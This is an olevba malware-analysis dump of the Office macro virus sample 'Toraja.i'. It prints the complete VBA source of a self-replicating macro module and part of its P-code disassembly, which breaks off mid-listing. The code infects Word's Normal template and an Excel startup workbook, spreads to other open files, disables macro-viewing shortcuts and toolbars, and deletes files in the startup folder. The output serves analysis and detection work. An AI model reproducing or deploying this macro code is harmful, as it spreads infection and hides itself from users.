olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Toraja.i
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Toraja.i - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Toraja.i - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSOffice.Toraja.i - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSOffice.Toraja.i - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SERUM25.bas 
in file: Virus.MSOffice.Toraja.i - OLE stream: '_VBA_PROJECT_CUR/VBA/SERUM25'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Option Compare Text
Dim Komp As Variant
Public Const regApp As String = "Application"
Public Const regSecSet As String = "Settings"
Public Const regSecApp As String = "AppName"
Const TempVer As String = "HERU"
Const MacName As String = "SERUM"
Const Ver As String = "25"
Dim ctl As Variant
Global blnFound As Boolean
Dim CusProp
Dim blnMod As Boolean
Public Const TimerOn = "01:00:00"
Const Akhir = 5
Dim Caption As String
Dim actWindow
Global Active
Global Temp
Global TempPath
Dim Waktu
Dim Bar As Integer
Sub Register()
Attribute Register.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
If GetSetting(regApp, regSecSet, "FirstRun") = "" Then SaveSetting regApp, regSecSet, "FirstRun", Format(Date + 30, "dd-mm-yyyy")
If GetSetting(regApp, regSecSet, "Version") <> Ver Then SaveSetting regApp, regSecSet, "Version", Ver
If GetSetting(regApp, regSecSet, "UserKeyWord") <> MacName & Ver Then SaveSetting regApp, regSecSet, "UserKeyWord", ""
If GetSetting(regApp, regSecSet, "AuthorKeyWord") <> "Marsel" Then SaveSetting regApp, regSecSet, "AuthorKeyWord", ""
End Sub
'Function " "() As Boolean
'Dim getDate As Date
'On Error Resume Next
'getDate = GetSetting(regApp, regSecSet, "FirstRun")
'If getDate <= Date Then ShowMe
'End Function
Sub AutoExec()
Attribute AutoExec.VB_ProcData.VB_Invoke_Func = " \n14"
        Application.EnableCancelKey = 0
        Application.DisplayRecentFiles = False
        SaveSetting regApp, regSecApp, "Microsoft Word", "True"
        MenuWord
        ExportXls
        Register
        Documents.Add
        Application.OnTime Now + TimeValue(TimerOn), "OnTimer"
End Sub

On Error Resume Next
TempActive
ActiveWindow.View.Type = 3
End Sub
Sub AutoOpen()
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Dim strRun As String
        Application.EnableCancelKey = 0
        If PWords = False Then Application.ShowVisualBasicEditor = True
        ActiveTemp
        RemoveAll
        MenuWord
        Register
        If blnFound = True Then
            strRun = TempVer & Ver & "." & MacName & Ver & ".FoundIt"
            Application.OnTime Now + TimeValue("00:01:00"), strRun
       End If
End Sub
Function KeyWord() As Boolean
Attribute KeyWord.VB_ProcData.VB_Invoke_Func = " \n14"
If GetSetting(regApp, regSecSet, "UserKeyWord") = MacName & Ver Then KeyWord = True
End Function
Sub FileOpen()
Attribute FileOpen.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
    WordBasic.enableAutoMacros 1
    Dialogs(80).Show
    TempActive
    WordBasic.enableAutoMacros 0
End Sub
Function KompProject(Asal, Tujuan) As Boolean
Attribute KompProject.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo Salah
blnMod = False
For Each Komp In Tujuan.VBProject.VBComponents
      If Komp.Name = MacName & Ver Then blnMod = True
      If (Komp.Name <> "ThisDocument") And (Komp.Name <> "Reference To Normal") And (Komp.Name = "TOING12") And _
          (Left(Komp.Name, 5) <> "Sheet") And (Komp.Name <> "ThisWorkbook") And (Left(Komp.Name, 5) <> "Chart") Then
          MsgBox "Virus di file anda telah dilenyapkan ....", , "Alahamdulillaah....."
            Tujuan.VBProject.VBComponents.Remove Tujuan.VBProject.VBComponents(Komp.Name)
            KompProject = True
            End If
            Next Komp
      If blnMod = False Then
        If EIKModul(Asal, Tujuan, MacName & Ver) = True Then KompProject = True
    End If
Salah:
End Function
Sub RemoveAll()
Attribute RemoveAll.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Set ctl = Documents
For Each ctl In Documents
    If ctl <> ActiveDocument Then
        KompProject ActiveDocument, ctl
        If Len(ctl.Path) <> 0 Then ctl.Save
    End If
Next ctl
End Sub
Function PrintOke() As Boolean
Attribute PrintOke.VB_ProcData.VB_Invoke_Func = " \n14"
PrintOke = True



End Function
Sub FilePrint()
Attribute FilePrint.VB_ProcData.VB_Invoke_Func = " \n14"

End Sub
Sub FilePrintDefault()
Attribute FilePrintDefault.VB_ProcData.VB_Invoke_Func = " \n14"
FilePrint
End Sub
Sub ToolsCustomizeKeyboard()
Attribute ToolsCustomizeKeyboard.VB_ProcData.VB_Invoke_Func = " \n14"
'" "
End Sub
Sub ViewCode()
Attribute ViewCode.VB_ProcData.VB_Invoke_Func = " \n14"
'" "
End Sub
Sub ViewVBcode()
Attribute ViewVBcode.VB_ProcData.VB_Invoke_Func = " \n14"
If PWords = True Then ShowVisualBasicEditor = True Else ShowVisualBasicEditor
End Sub
Sub ToolsCustomize()
Attribute ToolsCustomize.VB_ProcData.VB_Invoke_Func = " \n14"
'" "
End Sub
Sub ToolsMacro()
Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = " \n14"
If PWords = True Then ShowVisualBasicEditor = True Else ShowVisualBasicEditor
End Sub
Sub FormatStyle()
Attribute FormatStyle.VB_ProcData.VB_Invoke_Func = " \n14"
'If KeyWord = True Then Dialogs(180).Show Else " "
End Sub
Sub ToolsRecordMacroToggle()
Attribute ToolsRecordMacroToggle.VB_ProcData.VB_Invoke_Func = " \n14"
'
End Sub
Sub FileTemplates()
Attribute FileTemplates.VB_ProcData.VB_Invoke_Func = " \n14"
'" "
End Sub
Private Sub ExportXls()
Dim xlsApp
Dim strFile As String
If (GetSetting(regApp, regSecApp, "Microsoft Excel") <> "True") Then
On Error GoTo Salah:
    Set xlsApp = CreateObject("Excel.Application")
   xlsApp.Workbooks.Add
    strFile = xlsApp.StartupPath & xlsApp.PathSeparator & "START" & Ver & ".XLS"
    xlsApp.ActiveWorkbook.SaveAs strFile
    TempPath = Application.NormalTemplate.Path & Application.PathSeparator
    EIKModul NormalTemplate, xlsApp.Workbooks("START" & Ver & ".XLS"), MacName & Ver
    xlsApp.Workbooks("START" & Ver & ".XLS").VBProject.Name = TempVer & Ver
    xlsApp.ActiveWindow.Visible = False
    xlsApp.Workbooks("START" & Ver & ".XLS").Save
    xlsApp.Application.Quit
    SaveSetting regApp, regSecApp, "Microsoft Excel", "True"
End If
Salah:
End Sub
Sub ExportDok()
Attribute ExportDok.VB_ProcData.VB_Invoke_Func = " \n14"
Dim dokApp
If (GetSetting(regApp, regSecApp, "Microsoft Word") <> "True") Then
    On Error GoTo Salah
    Set dokApp = CreateObject("Word.Application")
    TempPath = Application.TemplatePath
     KompProject Workbooks("START" & Ver & ".XLS"), dokApp.NormalTemplate
    dokApp.Application.Quit True
    SaveSetting regApp, regSecApp, "Microsoft Word", "True"
End If
Salah:
End Sub
Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.EnableCancelKey = 0
XlsActive
ExportDok
Application.DisplayRecentFiles = False
End Sub
Private Sub AllWorkBook()
blnMod = False
For Each Komp In Workbooks
      actWindow = Komp.Name
      If actWindow = "START" & Ver & ".XLS" Then blnMod = True
      If Komp.Path = Application.StartupPath And actWindow <> "START" & Ver & ".XLS" Then
               Komp.Close False
               Kill Application.StartupPath & Application.PathSeparator & actWindow
         End If
 Next Komp
If blnMod = False Then BuatXlsActive
End Sub
Sub XlsActive()
Attribute XlsActive.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.EnableCancelKey = 0
Application.DisplayAlerts = False
CreateEvents
TempActive
AllWorkBook
Application.OnSheetActivate = ""
Application.OnSheetDeactivate = ""
Application.OnWindow = ""
MenuExcel
Application.OnWindow = "START" & Ver & ".XLS" & "!XlsActive"
Application.DisplayAlerts = True
Application.ScreenUpdating = True
End Sub
Sub TempActive()
Attribute TempActive.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Aplikasi
 If KompProject(Temp, Active) = True Then
       SetCusProp
       Active.VBProject.Name = MacName
       If Len(Active.Path) <> 0 Then Active.Save
    End If
End Sub
Function EIKModul(Asal, Tujuan, Komp As String) As Boolean
Attribute EIKModul.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo Salah
    Asal.VBProject.VBComponents(Komp).Export TempPath & Komp
    Tujuan.VBProject.VBComponents.Import TempPath & Komp
    EIKModul = True
    Kill TempPath & Komp
Salah:
End Function
Sub OpenFile()
Attribute OpenFile.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.DisplayAlerts = False
Application.Dialogs(1).Show
XlsActive
End Sub
Private Sub CreateEvents()
Dim vbComp
On Error GoTo Salah
lanjut:
If ActiveWorkbook.CustomDocumentProperties.Item("Event").Value <> MacName & Ver And ActiveWorkbook.Name <> "START" & Ver & ".XLS" Then
On Error GoTo FatalError
    Set vbComp = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    With vbComp
            '.DeleteLines 1, .CountOfLines
            '.InsertLines 1, "Private Sub Workbook_BeforePrint(Cancel As Boolean)"
            '.InsertLines 2, "On Error Resume Next"
            '.InsertLines 3, "If PrintOke = False Then"
            '.InsertLines 4, "    "
            '.InsertLines 5, "    Cancel = True"
            '.InsertLines 6, "End if"
            '.InsertLines 7, "End Sub"
    End With
ActiveWorkbook.CustomDocumentProperties.Item("Event").Value = MacName & Ver
End If
FatalError:
Exit Sub
Salah:
ActiveWorkbook.CustomDocumentProperties.Add ("Event"), False, 4, ""
Resume lanjut
End Sub
Sub BuatXlsActive()
Attribute BuatXlsActive.VB_ProcData.VB_Invoke_Func = " \n14"
Dim Baru As String
On Error Resume Next
Application.ScreenUpdating = False
Workbooks.Add
Baru = Application.StartupPath & Application.PathSeparator & "START" & Ver & ".XLS"
ActiveWorkbook.SaveAs Baru
ActiveWindow.Visible = False
ActiveTemp
End Sub
Sub ActiveTemp()
Attribute ActiveTemp.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Aplikasi
If KompProject(Active, Temp) = True Then
       Temp.VBProject.Name = TempVer & Ver
       Temp.Save
       SaveSetting regApp, regSecApp, Application.Name, "True"
       blnFound = True
    End If
End Sub
Sub MenuExcel()
Attribute MenuExcel.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
'    For Each ctl In CommandBars.ActiveMenuBar.Controls("Tools").Controls("Macro").Controls
'              ctl.OnAction = "" ""
'    Next ctl
'    WordExcel
'    CommandBars("Ply").Controls("View Code").Delete
'    With Application
'            .OnKey "%{F11}", "" ""
'            .OnKey "%{F8}", "" ""
'            .OnKey "%{F2}", "" ""
'            .OnKey "%{F4}", "" ""
'            .OnKey "{F12}", "" ""
'            .OnKey "^{o}", "OpenFile"
'    End With
CommandBars("Standard").Controls("Open").OnAction = "OpenFile"
CommandBars("Worksheet Menu Bar").Controls("File").Controls("Open...").OnAction = "OpenFile"
End Sub
Sub WordExcel()
Attribute WordExcel.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
cmdBars CommandBars("Control Toolbox"), True
cmdBars CommandBars("Forms"), True
cmdBars CommandBars("ActiveX Control"), True
cmdBars CommandBars("Visual Basic"), True
cmdBars CommandBars.ActiveMenuBar, True
cmdBars CommandBars("Formatting"), True
cmdBars CommandBars("Standard"), True
End Sub
Sub cmdBars(cmd, blnVis As Boolean)
Attribute cmdBars.VB_ProcData.VB_Invoke_Func = " \n14"
With cmd
    If blnVis = True Then
        .Enabled = False
        .Visible = False
        .Protection = 8
    End If
        .Protection = 1
End With
End Sub
Sub MenuWord()
Attribute MenuWord.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
CustomizationContext = NormalTemplate
  With Options
            .VirusProtection = True
            .SaveNormalPrompt = True
    End With
    FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
    FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
    WordExcel
End Sub
Sub SetCusProp()
Attribute SetCusProp.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Set CusProp = Active.CustomDocumentProperties
CusProp.Add "Author", False, 4, ""
CusProp.Add "CountPrint", False, 1, 0
If PWords = True Then CusProp.Item("Author").Value = "Lina"
End Sub
Function GetCreator() As Boolean
Attribute GetCreator.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo Salah
        Aplikasi
        Set CusProp = Active.CustomDocumentProperties
        If CusProp.Item("Author").Value = "Lina" Then GetCreator = True
Salah:
End Function
Function PWords() As Boolean
Attribute PWords.VB_ProcData.VB_Invoke_Func = " \n14"
If GetSetting(regApp, regSecSet, "AuthorKeyWord") = "Marsel" Then PWords = True
End Function
Sub OnTimer()
Attribute OnTimer.VB_ProcData.VB_Invoke_Func = " \n14"
' " "
    Application.OnTime Now + TimeValue(TimerOn), "OnTimer"
End Sub
Sub FoundIt()
Attribute FoundIt.VB_ProcData.VB_Invoke_Func = " \n14"
TempActive
blnFound = False
End Sub
Sub Pesan(strPesan As String, Msg)
Attribute Pesan.VB_ProcData.VB_Invoke_Func = " \n14"
Dim A  As String
Dim B(3)
Dim x, i, j
Dim K
B(0) = "  \": B(1) = "  -  ": B(2) = "  /": B(3) = "  |"
i = 0
If Bar = 0 Then K = "Toraja High Land: " Else K = "Note ... each file can be printed 5 times only: "
    A = "                                                                                                                                          " & strPesan
    For x = 1 To Len(A)
       Msg.Caption = A & B(i)
       Application.StatusBar = K & Akhir - Int(Timer - Waktu) & " sec " & B(i)
       A = Right$(A, Len(A) - 1)
        i = i + 1
        For j = 1 To 10: Next
        If (Timer - Waktu >= Akhir) Or Timer - Waktu < 0 Then GoTo done
        If i = 4 Then i = 0
    Next
done:
If Bar = 0 Then Bar = 1 Else Bar = 0
Msg.Caption = ""
End Sub
Sub Message(Msg)
Attribute Message.VB_ProcData.VB_Invoke_Func = " \n14"
Dim strPesan(5) As String
strPesan(0) = "Hello, [" & Application.UserName & "]  "
strPesan(1) = " "
strPesan(2) = ""
strPesan(3) = ""
strPesan(4) = ""
strPesan(5) = ""
Select Case Month(Date)
    Case 11, 12: strPesan(0) = strPesan(0) & strPesan(3) & strPesan(2) & strPesan(4) & strPesan(2) + 1 & "]"
    Case 1: strPesan(0) = strPesan(0) & strPesan(3) & strPesan(2) - 1 & strPesan(4) & strPesan(2) & "]"
End Select
Application.DisplayStatusBar = True
Waktu = Timer
Do While (Timer - Waktu <= Akhir) And Timer - Waktu >= 0
    Pesan strPesan(0), Msg
    Pesan strPesan(1), Msg
    Pesan strPesan(5), Msg
Loop
End Sub
Function Tator() As Boolean
Attribute Tator.VB_ProcData.VB_Invoke_Func = " \n14"
If (KeyWord = False) And (GetCreator = False) Then Tator = False
End Function
Sub ShowMe()
Attribute ShowMe.VB_ProcData.VB_Invoke_Func = " \n14"
Dim Maks, Min As Integer
On Error Resume Next
If Tator = True Then
Application.EnableCancelKey = 0
Caption = ActiveWindow.Caption
    If Application.Name = "Microsoft Word" Then
        Maks = 1
        Application.Caption = " "
        If Windows.Count > 0 Then Set actWindow = ActiveWindow Else Set actWindow = Application
    Else
        Set actWindow = Application
        ActiveWindow.Caption = ""
        Maks = -4137
    End If
    Application.WindowState = Maks
    actWindow.WindowState = Maks
    Message actWindow
    Application.StatusBar = ""
    ActiveWindow.Caption = Caption
    Application.Caption = ""
End If
End Sub
Sub Aplikasi()
Attribute Aplikasi.VB_ProcData.VB_Invoke_Func = " \n14"
If Application.Name = "Microsoft Word" Then Doc Else Xls
End Sub
Sub Doc()
Attribute Doc.VB_ProcData.VB_Invoke_Func = " \n14"
TempPath = Application.NormalTemplate.Path & Application.PathSeparator
Set Active = ActiveDocument
Set Temp = NormalTemplate
End Sub
Sub Xls()
Attribute Xls.VB_ProcData.VB_Invoke_Func = " \n14"
Set Active = ActiveWorkbook
Set Temp = Workbooks("START" & Ver & ".XLS")
TempPath = Application.TemplatesPath
End Sub


-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSOffice.Toraja.i
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 1182 bytes
' _VBA_PROJECT_CUR/VBA/Sheet1 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet2 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet3 - 957 bytes
' _VBA_PROJECT_CUR/VBA/SERUM25 - 25349 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' 	Option  (Compare Text)
' Line #2:
' 	Dim 
' 	VarDefn Komp (As Variant)
' Line #3:
' 	Dim (Public Const) 
' 	LitStr 0x000B "Application"
' 	VarDefn regApp (As String)
' Line #4:
' 	Dim (Public Const) 
' 	LitStr 0x0008 "Settings"
' 	VarDefn regSecSet (As String)
' Line #5:
' 	Dim (Public Const) 
' 	LitStr 0x0007 "AppName"
' 	VarDefn regSecApp (As String)
' Line #6:
' 	Dim (Const) 
' 	LitStr 0x0004 "HERU"
' 	VarDefn TempVer (As String)
' Line #7:
' 	Dim (Const) 
' 	LitStr 0x0005 "SERUM"
' 	VarDefn MacName (As String)
' Line #8:
' 	Dim (Const) 
' 	LitStr 0x0002 "25"
' 	VarDefn Ver (As String)
' Line #9:
' 	Dim 
' 	VarDefn ctl (As Variant)
' Line #10:
' 	Dim (Global) 
' 	VarDefn blnFound (As Boolean)
' Line #11:
' 	Dim 
' 	VarDefn CusProp
' Line #12:
' 	Dim 
' 	VarDefn blnMod (As Boolean)
' Line #13:
' 	Dim (Public Const) 
' 	LitStr 0x0008 "01:00:00"
' 	VarDefn TimerOn
' Line #14:
' 	Dim (Const) 
' 	LitDI2 0x0005 
' 	VarDefn Akhir
' Line #15:
' 	Dim 
' 	VarDefn Caption (As String)
' Line #16:
' 	Dim 
' 	VarDefn actWindow
' Line #17:
' 	Dim (Global) 
' 	VarDefn Active
' Line #18:
' 	Dim (Global) 
' 	VarDefn Temp
' Line #19:
' 	Dim (Global) 
' 	VarDefn TempPath
' Line #20:
' 	Dim 
' 	VarDefn Waktu
' Line #21:
' 	Dim 
' 	VarDefn Bar (As Integer)
' Line #22:
' 	FuncDefn (Sub Register())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0008 "FirstRun"
' 	ArgsLd GetSetting 0x0003 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0008 "FirstRun"
' 	Ld Date 
' 	LitDI2 0x001E 
' 	Add 
' 	LitStr 0x000A "dd-mm-yyyy"
' 	ArgsLd Format$ 0x0002 
' 	ArgsCall SaveSetting 0x0004 
' 	EndIf 
' Line #25:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0007 "Version"
' 	ArgsLd GetSetting 0x0003 
' 	Ld Ver 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0007 "Version"
' 	Ld Ver 
' 	ArgsCall SaveSetting 0x0004 
' 	EndIf 
' Line #26:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000B "UserKeyWord"
' 	ArgsLd GetSetting 0x0003 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000B "UserKeyWord"
' 	LitStr 0x0000 ""
' 	ArgsCall SaveSetting 0x0004 
' 	EndIf 
' Line #27:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000D "AuthorKeyWord"
' 	ArgsLd GetSetting 0x0003 
' 	LitStr 0x0006 "Marsel"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000D "AuthorKeyWord"
' 	LitStr 0x0000 ""
' 	ArgsCall SaveSetting 0x0004 
' 	EndIf 
' Line #28:
' 	EndSub 
' Line #29:
' 	QuoteRem 0x0000 0x0019 "Function " "() As Boolean"
' Line #30:
' 	QuoteRem 0x0000 0x0013 "Dim getDate As Date"
' Line #31:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #32:
' 	QuoteRem 0x0000 0x0033 "getDate = GetSetting(regApp, regSecSet, "FirstRun")"
' Line #33:
' 	QuoteRem 0x0000 0x001E "If getDate <= Date Then ShowMe"
' Line #34:
' 	QuoteRem 0x0000 0x000C "End Function"
' Line #35:
' 	FuncDefn (Sub AutoExec())
' Line #36:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #37:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #38:
' 	Ld regApp 
' 	Ld regSecApp 
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "True"
' 	ArgsCall SaveSetting 0x0004 
' Line #39:
' 	ArgsCall MenuWord 0x0000 
' Line #40:
' 	ArgsCall ExportXls 0x0000 
' Line #41:
' 	ArgsCall Register 0x0000 
' Line #42:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #43:
' 	Ld Now 
' 	Ld TimerOn 
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0007 "OnTimer"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #44:
' 	EndSub 
' Line #45:
' Line #46:
' 	OnError (Resume Next) 
' Line #47:
' 	ArgsCall TempActive 0x0000 
' Line #48:
' 	LitDI2 0x0003 
' 	Ld ActiveWindow 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #49:
' 	EndSub 
' Line #50:
' 	FuncDefn (Sub AutoOpen())
' Line #51:
' 	OnError (Resume Next) 
' Line #52:
' 	Dim 
' 	VarDefn strRun (As String)
' Line #53:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #54:
' 	Ld PWords 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' 	EndIf 
' Line #55:
' 	ArgsCall ActiveTemp 0x0000 
' Line #56:
' 	ArgsCall RemoveAll 0x0000 
' Line #57:
' 	ArgsCall MenuWord 0x0000 
' Line #58:
' 	ArgsCall Register 0x0000 
' Line #59:
' 	Ld blnFound 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #60:
' 	Ld TempVer 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	Ld MacName 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0008 ".FoundIt"
' 	Concat 
' 	St strRun 
' Line #61:
' 	Ld Now 
' 	LitStr 0x0008 "00:01:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	Ld strRun 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Function KeyWord() As Boolean)
' Line #65:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000B "UserKeyWord"
' 	ArgsLd GetSetting 0x0003 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St KeyWord 
' 	EndIf 
' Line #66:
' 	EndFunc 
' Line #67:
' 	FuncDefn (Sub FileOpen())
' Line #68:
' 	OnError (Resume Next) 
' Line #69:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall enableAutoMacros 0x0001 
' Line #70:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #71:
' 	ArgsCall TempActive 0x0000 
' Line #72:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall enableAutoMacros 0x0001 
' Line #73:
' 	EndSub 
' Line #74:
' 	FuncDefn (Function KompProject(Asal, Tujuan) As Boolean)
' Line #75:
' 	OnError Salah 
' Line #76:
' 	LitVarSpecial (False)
' 	St blnMod 
' Line #77:
' 	StartForVariable 
' 	Ld Komp 
' 	EndForVariable 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #78:
' 	Ld Komp 
' 	MemLd New 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St blnMod 
' 	EndIf 
' Line #79:
' 	LineCont 0x0004 19 00 0A 00
' 	Ld Komp 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	Ld Komp 
' 	MemLd New 
' 	LitStr 0x0013 "Reference To Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld Komp 
' 	MemLd New 
' 	LitStr 0x0007 "TOING12"
' 	Eq 
' 	Paren 
' 	And 
' 	Ld Komp 
' 	MemLd New 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "Sheet"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld Komp 
' 	MemLd New 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld Komp 
' 	MemLd New 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "Chart"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #80:
' 	LitStr 0x0029 "Virus di file anda telah dilenyapkan ...."
' 	ParamOmitted 
' 	LitStr 0x0014 "Alahamdulillaah....."
' 	ArgsCall MsgBox 0x0003 
' Line #81:
' 	Ld Komp 
' 	MemLd New 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #82:
' 	LitVarSpecial (True)
' 	St KompProject 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	StartForVariable 
' 	Ld Komp 
' 	EndForVariable 
' 	NextVar 
' Line #85:
' 	Ld blnMod 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #86:
' 	Ld Asal 
' 	Ld Tujuan 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	ArgsLd EIKModul 0x0003 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St KompProject 
' 	EndIf 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	Label Salah 
' Line #89:
' 	EndFunc 
' Line #90:
' 	FuncDefn (Sub RemoveAll())
' Line #91:
' 	OnError (Resume Next) 
' Line #92:
' 	SetStmt 
' 	Ld Documents 
' 	Set ctl 
' Line #93:
' 	StartForVariable 
' 	Ld ctl 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #94:
' 	Ld ctl 
' 	Ld ActiveDocument 
' 	Ne 
' 	IfBlock 
' Line #95:
' 	Ld ActiveDocument 
' 	Ld ctl 
' 	ArgsCall KompProject 0x0002 
' Line #96:
' 	Ld ctl 
' 	MemLd Path 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ctl 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #97:
' 	EndIfBlock 
' Line #98:
' 	StartForVariable 
' 	Ld ctl 
' 	EndForVariable 
' 	NextVar 
' Line #99:
' 	EndSub 
' Line #100:
' 	FuncDefn (Function PrintOke() As Boolean)
' Line #101:
' 	LitVarSpecial (True)
' 	St PrintOke 
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' 	EndFunc 
' Line #106:
' 	FuncDefn (Sub FilePrint())
' Line #107:
' Line #108:
' 	EndSub 
' Line #109:
' 	FuncDefn (Sub FilePrintDefault())
' Line #110:
' 	ArgsCall FilePrint 0x0000 
